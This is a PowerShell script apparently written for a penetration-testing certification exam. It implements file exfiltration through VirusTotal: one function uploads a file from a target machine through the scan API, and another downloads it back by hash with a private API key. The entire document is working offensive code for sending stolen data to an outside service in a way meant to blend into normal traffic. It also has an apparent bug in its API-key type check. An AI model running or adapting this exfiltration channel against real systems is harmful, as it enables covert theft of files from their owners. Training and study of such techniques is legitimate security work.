## Powershell For Penetration Testers Exam Task 8 - Use a popular third party website for exfilteration.

function UploadFileVT {

<#

.SYNOPSIS
Powershell cmdlet to exfilterate file using VirusTotal
 
.DESCRIPTION
PowerShell script used to upload needed files from target to VirusTotal and then download them
	
.PARAMETER APIKey
VirusTotal user API key

.PARAMETER file
File name to upload to VirusTotal for exfilteration

.Example
 . .\Exfilterate-VirusTotal.ps1
 UploadFileVT -APIKey <User API Key> -file <File To Upload>

.LINK    
https://github.com/darkoperator/Posh-VirusTotal/blob/master/README.md
https://github.com/LogRhythm-Labs/VirusTotal/blob/master/vt-check.ps1
https://archive.codeplex.com/?p=psvirustotal

	
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225

#>


    [CmdletBinding()]
    Param( 
    [Parameter()]
	[String] $APIKey,
    
	[Parameter()]
    [System.IO.FileInfo] $file
    )
	
	# This function used to return an text formatted string
	function Get-AsciiBytes([String] $str) {
            return [System.Text.Encoding]::ASCII.GetBytes($str)            
        }
    
    # VirusTotal api link to upload files
	$URL = 'https://www.virustotal.com/vtapi/v2/file/scan'
    [byte[]]$CRLF = 13, 10

     
    
    # Building the rest request body
    [String] $method = 'POST'
    $ReqBody = New-Object System.IO.MemoryStream
    $Reqbound = [Guid]::NewGuid().ToString().Replace('-','')
    $ReqCT = 'multipart/form-data; boundary=' + $Reqbound
    $ReqBody2 = Get-AsciiBytes ('--' + $Reqbound)
    $ReqBody.Write($ReqBody2, 0, $ReqBody2.Length)
    $ReqBody.Write($CRLF, 0, $CRLF.Length)
        
    $ReqBody1 = (Get-AsciiBytes ('Content-Disposition: form-data; name="apikey"'))
    $ReqBody.Write($ReqBody1, 0, $ReqBody1.Length)

    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    
    $ReqBody1 = (Get-AsciiBytes $APIKey)
    $ReqBody.Write($ReqBody1, 0, $ReqBody1.Length)

    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    $ReqBody.Write($ReqBody2, 0, $ReqBody2.Length)
    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    
    $ReqBody1 = (Get-AsciiBytes ('Content-Disposition: form-data; name="file"; filename="' + $file.Name + '";'))
    $ReqBody.Write($ReqBody1, 0, $ReqBody1.Length)
    $ReqBody.Write($CRLF, 0, $CRLF.Length)            
    $ReqBody1 = (Get-AsciiBytes 'Content-Type:application/octet-stream')
    $ReqBody.Write($ReqBody1, 0, $ReqBody1.Length)
        
    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    
	# Parsing the supplied path from user
	$path = pwd | select -ExpandProperty Path
	$file = $file -creplace '(?s)^.*\\', ''
	$path = $path + "\$file"
	
	write-host "[+] Uploading file $path to VirusTotal" -ForegroundColor Green
	# Try to read the file and store it in the request body
	try{
    $ReqBody1 = [System.IO.File]::ReadAllBytes($path)
	
	
    $ReqBody.Write($ReqBody1, 0, $ReqBody1.Length)

    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    $ReqBody.Write($ReqBody2, 0, $ReqBody2.Length)
    
    $ReqBody1 = (Get-AsciiBytes '--')
    $ReqBody.Write($ReqBody1, 0, $ReqBody1.Length)
    
    $ReqBody.Write($CRLF, 0, $CRLF.Length)
    
    # Invoking the rest request   
    $RestRequest = Invoke-RestMethod -Method $method -Uri $URL -ContentType $ReqCT -Body $ReqBody.ToArray()
	
	# Saving the needed returned request output
	$filemd5 = $RestRequest.md5
	$filesha256 = $RestRequest.sha256
	$filesha1 = $RestRequest.sha1
	
	# Print some output to the user
	write-host "[+] File uploaded successfully..." -ForegroundColor Green
	write-host "[+] Printing Results:" -ForegroundColor Green
	write-host "[+] File MD5: $filemd5" -ForegroundColor Cyan
	write-host "[+] File sha256: $filesha256" -ForegroundColor Cyan
	write-host "[+] File sha1: $filesha1" -ForegroundColor Cyan
	
	}
	
	# Catching exceptions if any
	catch {
		write-host "[-] file $path not uploaded, check if file exist!" -ForegroundColor Red
	}
			            
}


function DownloadFileVT
{

<#

.SYNOPSIS
Powershell cmdlet to download uploaded files using VirusTotal
 
.DESCRIPTION
PowerShell script cmdlet to download exfilterated files from VirusTotal to local machine

.PARAMETER hash
The file hash to download
	
.PARAMETER APIKey
VirusTotal user API key

.PARAMETER outFile
File name on loacl machine to save downloaded file

.Example
 . .\Exfilterate-VirusTotal.ps1
 DownloadFileVT -hash <File Hash> -APIKey <User API Key> -outFile <Filename to save the sample>

.LINK    
https://github.com/darkoperator/Posh-VirusTotal/blob/master/README.md
https://github.com/LogRhythm-Labs/VirusTotal/blob/master/vt-check.ps1
https://archive.codeplex.com/?p=psvirustotal

	
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225

#>

    [CmdletBinding()]
    Param
    (
        # File MD5,Sha265 or sha1.
        [Parameter(Mandatory=$true)]
        [string]$hash,

        # API key for virustotal.
        [Parameter(Mandatory=$true)]
		[string]$APIKey,

        # File name to save the downloaded sample.
        [Parameter(Mandatory=$true)]
        [string]$outFile
    )
	
	 function GetAPIKeyType
	{

		# VirusTotal API link to check the API key details
		$URL = 'http://www.virustotal.com/vtapi/v2/key/details'
		
		# Start building parameters for REST Method invokation.
		$ReqBody = @{'apikey'= $APIKey}
		$ReqParams =  @{}
		$ReqParams.add('Body', $ReqBody)
		$ReqParams.add('Method', 'Get')
		$ReqParams.add('Uri',$URL)
		$ReqParams.Add('ErrorVariable', 'ReqError')

		$APIKeyType = Invoke-RestMethod @ReqParams
		
		if ($ReqError)
		{
			if ($ReqError.Message.Contains('403'))
			{
				write-host '[-] The API key used was invalid! Check the key and try again ...' -ForegroundColor Red
			}
			elseif ($ReqError.Message -like '*204*')
			{
				write-host 'You have reached the maximum rate usage, try again later ...' -ForegroundColor Red
			}
			else
			{
				write-host $ReqError
			}
		}

		return $APIKeyType.type
		
	}
    write-host '[+] Checking the API key info...' -ForegroundColor Green
    $keyType = GetAPIKeyType
	
	# Check if the key is private
	if ($keyType.type -ne 'private'){
		
		write-host '[-] The used key is not private API key ! ' -ForegroundColor Red 
		write-host '[-] Could not download the file ' -ForegroundColor Red
	
	
	}
	else 
	{
		# VirusTotal API link to download files
		$URI = 'https://www.virustotal.com/vtapi/v2/file/download'
		
		# Getting the current working directory to store the downloaded sample file on
		$currentD = pwd | select -ExpandProperty Path
		$sampleOutFile = $currentD + "\$outFile"
		
		# Start building parameters for REST Method invokation.
		$ReqBody = @{'apikey'= $APIKey}		
		$ReqBody.add('hash',$hash)
		$ReqParams =  @{}
		$ReqParams.add('Body', $ReqBody)
		$ReqParams.add('Method', 'Get')
		$ReqParams.add('Uri',$URI)
		$ReqParams.Add('ErrorVariable', 'ReqError')
		$ReqParams.Add('OutFile', $sampleOutFile)

		

		Write-host "[+] saving file in $sampleOutFile" "..." -ForegroundColor Green

		# invoke the rest method request
		$ReqResponse = Invoke-RestMethod @ReqParams


		if ($ReqError)
		{
			if ($ReqError.Message.Contains('403'))
			{
				write-host '[-] The API key used was invalid! Check the key and try again ...' -ForegroundColor Red
			}
			elseif ($ReqError.Message -like '*204*')
			{
				write-host '[-] You have reached the maximum rate usage, try again later ...' -ForegroundColor Red
			}
			else
			{
				$ReqError
			}
		}
    }
  
}
